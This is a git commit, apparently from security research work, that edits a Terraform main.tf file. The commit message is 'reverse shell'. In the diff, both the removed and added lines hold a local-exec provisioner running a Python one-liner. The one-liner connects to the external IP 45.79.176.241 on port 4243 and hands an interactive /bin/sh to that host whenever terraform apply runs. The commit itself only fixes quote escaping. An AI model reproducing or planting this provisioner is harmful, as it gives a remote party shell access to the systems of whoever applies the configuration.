3eef71210ecefdccb27fa5d08f77dae69c44f7e8
Valentin Leon <Valentin.Leon@nccgroup.trust>
2019-07-12 12:08:09 -0700

    reverse shell

--- main.tf
+++ main.tf
@@ -9,7 +9,7 @@ resource "random_id" "random" {
 
 resource "null_resource" "cmd10" {
   provisioner "local-exec" {
-      command = "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("45.79.176.241",4243));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'"
+      command = "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"45.79.176.241\",4243));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
         }
         }
 
